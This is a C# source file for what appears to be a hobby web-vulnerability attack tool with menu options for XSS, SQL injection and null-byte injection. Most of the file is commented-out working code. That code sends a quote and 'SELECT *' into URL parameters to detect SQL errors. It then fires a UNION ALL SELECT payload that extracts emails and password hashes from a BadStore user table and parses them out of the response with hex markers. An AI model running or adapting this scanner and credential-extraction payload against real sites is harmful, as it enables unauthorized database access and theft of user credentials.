using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text.RegularExpressions;

namespace ASE2._0
{
    internal class MainClass
    {
        public static void Main(string[] args)
        {
            Start:
            if (args is null)
            {
                throw new ArgumentNullException(nameof(args));
            }
            //  var url = args[0];

            Menu menu = new();
            string menuDisplayResponse = menu.MenuDisplay();


            switch (menuDisplayResponse)
            {
                case "1":
                    XSSI xSSI = new();
                    break;
                case "2":
                    SQLI sQLI = new();
                    break;
                case "3":
                    Console.WriteLine("Still in development");
                    break;
                case "4":
                    NullByteInjection nullByteI = new();
                    break;
                case "5":
                    CustomQuery custom = new();
                    break;
            }
            goto Start;
            //Console.WriteLine("Supply the URL to test.../n URL should be in <url>.com?param=&param2...format");
            //string submUrl = Console.ReadLine();
            //string url = IsHTTP(submUrl);
            //Console.WriteLine($"Testing if {url} is vulnerable to SQL Injection ");



        //Start:
        //    string[] parameters = url.Remove(0, url.IndexOf("?") + 1).Split('&');
        //    Console.Write("Paremeters to be tested are: ");
        //    foreach (string p in parameters)
        //    {
        //        Console.Write($"{p}, ");
        //    }


        //    string[] xxsiResult = XSSI(parameters, url);

        //    if (xxsiResult.Contains("No parameters were found"))
        //    {
        //        Console.WriteLine("Application does not seem to be vulnerable to XSS injection in parametrs given.\n" +
        //            "Would you like to try a different url?(Y for yes N for No)");
        //        string tryNewUrl = Console.ReadLine();
        //        tryNewUrl.ToUpper();
        //        if (tryNewUrl.Contains('Y'))
        //        {
        //            Console.WriteLine("input new url...");
        //            url = Console.ReadLine();
        //            goto Start;
        //        }
        //        else
        //        {
        //            Console.WriteLine("Continuing to test parameters for SQLI");
        //        }
        //    }
        //    string[] xssiVulnParameters = xxsiResult;


        //    string[] sqliResult = SQLI(parameters, url);
        //    var sqliVunParameters = sqliResult;





        //    if (sqliResult.Contains("No parameters were found to be vulnerable to SQLI attempts"))
        //    {
        //        Console.WriteLine("Application does not seem to be vulnerable to SQL injection in parametrs given.\n" +
        //            "Would you like to try a different url?(Y for yes N for No)");
        //        string tryNewUrl = Console.ReadLine();
        //        tryNewUrl.ToUpper();
        //        if (tryNewUrl.Contains('Y'))
        //        {
        //            Console.WriteLine("input new url...");
        //            url = Console.ReadLine();
        //            goto Start;
        //        }
        //        else
        //        {
        //            Console.WriteLine("Goodbye...");
        //            System.Environment.Exit(0);
        //        }
        //    }

        //    SqlinjectionAttempt(url, sqliVunParameters);

        //    Console.WriteLine("\n" +
        //            "Would you like to try a different url?(Y for yes N for No)");
        //    string newUrl = Console.ReadLine();

        //    if (newUrl.Contains('Y'))
        //    {
        //        Console.WriteLine("input new url...");
        //        url = Console.ReadLine();
        //        goto Start;
        //    }
        //    else
        //    {
        //        Console.WriteLine("Goodbye...");
        //        System.Environment.Exit(0);
        //    }

        //    Console.WriteLine("Goodbye...");
        //    System.Environment.Exit(0);

        //    static void SqlinjectionAttempt(string url, string[] parameters)
        //    {
        //        string fMarker = "BaSaExE";
        //        string mMarker = "eXeSsAb";
        //        string eMarker = "EXeBAsS";
        //        string fHex = string.Join("", fMarker.ToCharArray().Select(c => ((int)c).ToString("X2")));
        //        string mHex = string.Join("", mMarker.ToCharArray().Select(c => ((int)c).ToString("X2")));
        //        string eHex = string.Join("", eMarker.ToCharArray().Select(c => ((int)c).ToString("X2")));

        //        Console.WriteLine($"{fMarker}, {mMarker}, {eMarker}\n{fHex}, {mHex}, {eHex}");

        //        // string badStoreAddy = "172.16.1.129";
        //        //string URL = "http://"+badStoreAddy+"/cgi-bin/badstore.cgi";
        //        //+UNION+ALL+SELECT+NULL,+NULL,+CONCAT(0x7176627171,+email,+0x776872786573,passwd,0x71766b7671),+NULL+FROM+badstoredb.userdb%23&action=search&x=0&y=0
        //        string unionPayload = "Snake Oil' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x" + fHex + ",IFNULL(CAST(email AS CHAR),0x20),0x" + mHex + ",IFNULL(CAST(passwd as CHAR),0x20),0x" + eHex + ") FROM badstoredb.userdb-- ";
        //        //URL += "?searchquery=" + Uri.EscapeUriString(unionPayload) + "&action=search";
        //        string[] UP = new[] { unionPayload };

        //        foreach (string payload in UP)
        //        {
        //            foreach (string parms in parameters)
        //            {
        //                if (String.IsNullOrEmpty(parms))
        //                    return;
        //                string sqliURL = url.Replace(parms, parms + Uri.EscapeUriString(payload));
        //                Console.WriteLine($"{sqliURL}");
        //                HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(sqliURL);

        //                string httpWebResponse = string.Empty;
        //                using (StreamReader reader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()))
        //                    httpWebResponse = reader.ReadToEnd();

        //                Regex payloadRegex = new Regex(fMarker + "(.*?)" + mMarker + "(.*?)" + eMarker);
        //                MatchCollection matches = payloadRegex.Matches(httpWebResponse);

        //                foreach (Match match in matches)
        //                    Console.WriteLine($"Username: {match.Groups[1].Value}\t Password hash: {match.Groups[2].Value}");

        //            }
        //        }
        //    }

        //    //
        //}

        //private static string IsHTTP(string url2Test)
        //{
        //    string httpURL;
        //    if (!url2Test.Contains("http://"))
        //    {
        //        Console.WriteLine("Missing protocol \n Adding http:// to url");
        //        httpURL = "http://" + url2Test;
        //        url2Test = httpURL;
        //    }
        //    return url2Test;
        //}

        //private static string[] SQLI(string[] sqliParams, string url)
        //{
        //    bool isVuln = false;
        //    string noVulnParams = "No parameters were found to be vulnerable to SQLI attempts";

        //    int i = sqliParams.Length;
        //    string[] vulnParms = new string[i];
        //    string NoVulnParameters = "No Vuln parameters found..or end of code reached";

        //    for (int j = 0; j < i; j++)
        //    {
        //        foreach (string s in sqliParams)
        //        {
        //            string sqli = url.Replace(s, s + "'SELECT *");
        //            Console.WriteLine($"Testing {sqli} for SQLI Vulnerability");

        //            HttpWebRequest sqliWebRequest = (HttpWebRequest)WebRequest.Create(sqli);
        //            sqliWebRequest.Method = "GET";

        //            string sqliResp = string.Empty;
        //            using (StreamReader rdr = new
        //                StreamReader(sqliWebRequest.GetResponse().GetResponseStream()))
        //            {
        //                sqliResp = rdr.ReadToEnd();
        //            }
        //            if (sqliResp.Contains("SQL syntax"))
        //            {
        //                Console.WriteLine("**\nFOUND POSSIBLE SQL INJECTION in " + s + "\n**");
        //                isVuln = true;
        //                vulnParms[j] = s;
        //                return vulnParms;
        //            }
        //            else if (!sqliResp.Contains("SQL syntax"))
        //            {
        //                Console.WriteLine(noVulnParams);
        //                return new[] { noVulnParams };
        //            }


        //        }
        //    }
        //    return new[] { NoVulnParameters };

        }


    }
}